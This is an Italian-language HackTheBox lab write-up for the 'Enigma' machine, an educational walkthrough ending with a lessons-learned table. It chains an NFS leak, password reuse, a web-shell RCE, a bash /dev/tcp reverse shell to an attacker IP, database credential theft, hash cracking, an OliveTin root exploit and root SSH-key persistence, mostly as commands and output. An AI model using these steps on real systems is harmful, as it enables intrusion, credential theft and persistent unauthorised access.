<img src="../images/enigma.png" alt="enigma" style="border-radius: 50%; width: 150px;"> 

# Enigma - HackTheBox Writeup

> **Difficulty:** Easy &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Season:** 10 - Underground &nbsp;|&nbsp; **Date:** 08 Jul 2026
---
## Enumeration
### Nmap
```bash
nmap -p- 10.129.39.91 -oN nmap.txt
nmap -O -sV 10.129.39.91 -oN nmap.txt
```
Tra le porte aperte spicca **rpcbind** sulla 111. Si procede enumerando i servizi RPC esposti.
```bash
rpcinfo -p 10.129.39.91
```
### NFS Share
Si controllano le condivisioni NFS esportate:
```bash
showmount -e 10.129.39.91
```
```
Export list for 10.129.39.91:
/srv/nfs/onboarding *
```
Si monta la condivisione trovata:
```bash
sudo mkdir -p /mnt/nfs/onboarding
sudo mount -t nfs 10.129.39.91:/srv/nfs/onboarding /mnt/nfs/onboarding -o nolock,vers=3
```
All'interno si trova un PDF, `New_Employee_Access.pdf`, contenente delle credenziali di accesso alla webmail:
```
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```
---
## Exploitation - Roundcube Webmail
Il server di posta utilizza **Roundcube v1.6.16**. Le CVE note per Roundcube risultano applicabili solo a versioni precedenti, quindi non sfruttabili in questo caso.

Effettuando il login con le credenziali di **kevin**, si trova un'email che menziona un altro utente, **sarah**, che riutilizza la stessa password:
```
Username: sarah
Password: Enigma2024!
```
Accedendo alla casella di posta di sarah si recuperano le credenziali per un secondo servizio interno:
```
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```
---
## Lateral Movement - OpenSTAManager RCE
Il servizio di supporto è **OpenSTAManager v2.9.8**, per cui è pubblica una advisory di RCE:
```
https://github.com/devcode-it/openstamanager/security/advisories/GHSA-25fp-8w8p-mx36
```
La vulnerabilità permette di ottenere RCE caricando uno ZIP malevolo. Dopo l'upload, si verifica l'esecuzione tramite:
```
http://support_001.enigma.htb/files/SHELL.php?c=id
```
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Si identifica la shell in uso sul target:
```
http://support_001.enigma.htb/files/SHELL.php?c=echo%20$0
```
Risultato: `sh`. Si genera quindi una reverse shell compatibile su [revshells.com](https://www.revshells.com) e, dopo url-encoding, si esegue:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.21/4444 0>&1'
```
Si mette in ascolto un listener e si ottiene la callback:
```bash
nc -lnvp 4444
```
```
www-data@enigma:~/html/openstamanager/files$
```
---
## Da www-data a haris
Nel file di configurazione dell'applicazione si trovano le credenziali del database:
```
/var/www/html/openstamanager/config.inc.php

$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```
```bash
mysql -u brollin -pFri3nds@9099 -h 127.0.0.1 openstamanager
```
Nel database si recuperano due hash di password:
```
admin | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```
### Cracking con hashcat
```bash
hashcat -m 3200 -a 0 hash.txt /path/to/rockyou.txt
```
```
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```
> **Password trovata (haris):** `bestfriends`

Si effettua il login come **haris** e si stabilizza la shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
---
## Privilege Escalation - OliveTin CVE-2026-27626
Sulla macchina è in esecuzione un servizio **OliveTin** in locale, su `127.0.0.1:1337`. Per questo servizio è disponibile una PoC pubblica:
```
https://github.com/0xh7ml/CVE-2026-27626-PoC/blob/main/CVE-2026.27626.py
```
Si verifica l'esecuzione di comandi come root:
```bash
python3 OliveTin-CVE.py -u http://127.0.0.1 -p 1337 -x "id"
```
### Accesso root via SSH key injection
Si genera una coppia di chiavi SSH sulla propria macchina:
```bash
ssh-keygen -t rsa -b 4096
```
Si trasferisce la chiave pubblica sul target tramite netcat:
```bash
# sul target, in ricezione
nc -lnvp 4447 > id_rsa.pub

# in locale, invio
nc 10.129.39.91 4447 < id_rsa.pub
```
Sfruttando nuovamente la RCE di OliveTin, si aggiunge la chiave pubblica alle `authorized_keys` di root:
```bash
python3 OliveTin-CVE.py -u http://127.0.0.1 -p 1337 -x "cat /tmp/id_rsa.pub >> /root/.ssh/authorized_keys"
```
Infine, si accede come root via SSH:
```bash
ssh -i id_rsa root@10.129.39.91
```
---
## Lessons Learned
| # | Takeaway |
|---|----------|
| 1 | Le condivisioni NFS mal configurate possono esporre documenti sensibili (es. PDF con credenziali) |
| 2 | Il riuso delle password tra utenti diversi (kevin/sarah) è spesso la chiave per il movimento laterale |
| 3 | Verificare sempre la versione esatta dei CMS/gestionali esposti: exploit pubblici colpiscono spesso versioni specifiche (OpenSTAManager 2.9.8) |
| 4 | Le credenziali del database salvate in chiaro nei file di configurazione sono un vettore comune per l'escalation orizzontale |
| 5 | I servizi interni in ascolto solo su localhost (come OliveTin) non sono automaticamente sicuri se raggiungibili tramite RCE su altro servizio |
| 6 | L'iniezione della propria chiave pubblica in `authorized_keys` è un metodo pulito ed efficace per stabilire persistenza come root |
